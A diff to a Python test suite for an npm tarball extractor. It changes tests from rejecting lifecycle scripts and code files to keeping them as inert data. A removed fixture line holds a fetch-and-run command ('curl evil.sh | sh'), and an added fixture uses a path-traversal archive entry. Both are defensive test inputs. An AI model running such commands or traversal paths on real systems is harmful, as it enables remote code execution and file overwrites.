@@ -31,13 +31,13 @@ def _write_tarball(path: Path, members: dict[str, str]) -> Path:
     return path
 
 
-def _manifest(**overrides: str | dict[str, str]) -> str:
+def _manifest(**overrides: object) -> str:
     manifest: dict[str, object] = {"name": "acme-data", "version": "1.2.0", "scripts": {}}
     manifest.update(overrides)
     return json.dumps(manifest)
 
 
-def test_extract_copies_only_resource_dirs_and_records_hash(tmp_path: Path) -> None:
+def test_extract_copies_complete_package_and_records_hash(tmp_path: Path) -> None:
     tarball = _write_tarball(
         tmp_path / "pkg.tgz",
         {
@@ -56,25 +56,29 @@ def test_extract_copies_only_resource_dirs_and_records_hash(tmp_path: Path) -> N
     assert (dest / "skills" / "find.md").read_text(encoding="utf-8") == "# find skill"
     assert (dest / "prompts" / "greet.md").exists()
     assert (dest / "themes" / "dark.json").exists()
-    assert not (dest / "docs").exists()
+    assert (dest / "docs/ignored.md").is_file()
+    assert (dest / "package.json").is_file()
     expected = hashlib.sha256(tarball.read_bytes()).hexdigest()
     assert result.content_hash == expected
 
 
-def test_lifecycle_scripts_are_rejected(tmp_path: Path) -> None:
+def test_lifecycle_scripts_are_preserved_as_inert_manifest_data(tmp_path: Path) -> None:
     tarball = _write_tarball(
         tmp_path / "pkg.tgz",
         {
-            "package/package.json": _manifest(scripts={"preinstall": "curl evil.sh | sh"}),
+            "package/package.json": _manifest(scripts={"preinstall": "node prepare.js"}),
             "package/skills/s.md": "x",
         },
     )
 
-    with pytest.raises(NpmDataForbiddenError):
-        extract_npm_data(tarball, tmp_path / "data")
+    dest = tmp_path / "data"
+    extract_npm_data(tarball, dest)
+
+    manifest = json.loads((dest / "package.json").read_text(encoding="utf-8"))
+    assert manifest["scripts"]["preinstall"] == "node prepare.js"
 
 
-def test_malformed_scripts_field_is_rejected(tmp_path: Path) -> None:
+def test_non_object_scripts_field_is_inert_during_extraction(tmp_path: Path) -> None:
     tarball = _write_tarball(
         tmp_path / "pkg.tgz",
         {
@@ -83,37 +87,40 @@ def test_malformed_scripts_field_is_rejected(tmp_path: Path) -> None:
         },
     )
 
-    with pytest.raises(NpmDataForbiddenError):
-        extract_npm_data(tarball, tmp_path / "data")
+    dest = tmp_path / "data"
+    extract_npm_data(tarball, dest)
+    assert json.loads((dest / "package.json").read_text(encoding="utf-8"))["scripts"] == (
+        "postinstall.js"
+    )
 
 
-def test_typescript_extension_entries_are_rejected(tmp_path: Path) -> None:
+def test_typescript_extension_entries_are_preserved_without_execution(tmp_path: Path) -> None:
     tarball = _write_tarball(
         tmp_path / "pkg.tgz",
         {
             "package/package.json": _manifest(),
-            "package/extension.ts": "export const boom = 1;",
+            "package/extensions/index.ts": "export default function () { throw Error('not run') }",
         },
     )
 
-    with pytest.raises(NpmDataForbiddenError):
-        extract_npm_data(tarball, tmp_path / "data")
+    dest = tmp_path / "data"
+    extract_npm_data(tarball, dest)
+    assert "throw Error" in (dest / "extensions/index.ts").read_text(encoding="utf-8")
 
 
 @pytest.mark.parametrize("code_path", ["package/skills/run.py", "package/prompts/run.js"])
-def test_code_files_are_rejected_even_inside_resource_directories(
-    tmp_path: Path, code_path: str
-) -> None:
+def test_code_files_are_preserved_as_data_during_install(tmp_path: Path, code_path: str) -> None:
     tarball = _write_tarball(
         tmp_path / "pkg.tgz",
         {"package/package.json": _manifest(), code_path: "raise SystemExit"},
     )
 
-    with pytest.raises(NpmDataForbiddenError):
-        extract_npm_data(tarball, tmp_path / "data")
+    dest = tmp_path / "data"
+    extract_npm_data(tarball, dest)
+    assert (dest / code_path.removeprefix("package/")).is_file()
 
 
-def test_code_entry_manifest_fields_are_rejected(tmp_path: Path) -> None:
+def test_code_entry_manifest_fields_are_preserved(tmp_path: Path) -> None:
     tarball = _write_tarball(
         tmp_path / "pkg.tgz",
         {
@@ -122,8 +129,11 @@ def test_code_entry_manifest_fields_are_rejected(tmp_path: Path) -> None:
         },
     )
 
-    with pytest.raises(NpmDataForbiddenError):
-        extract_npm_data(tarball, tmp_path / "data")
+    dest = tmp_path / "data"
+    extract_npm_data(tarball, dest)
+    assert json.loads((dest / "package.json").read_text(encoding="utf-8"))["main"] == (
+        "extension.js"
+    )
 
 
 def test_rejected_archive_preserves_existing_destination(tmp_path: Path) -> None:
@@ -136,7 +146,7 @@ def test_rejected_archive_preserves_existing_destination(tmp_path: Path) -> None
         {
             "package/package.json": _manifest(),
             "package/skills/first.md": "written before failure",
-            "package/skills/run.py": "raise SystemExit",
+            "package/../../../escape": "invalid",
         },
     )
 
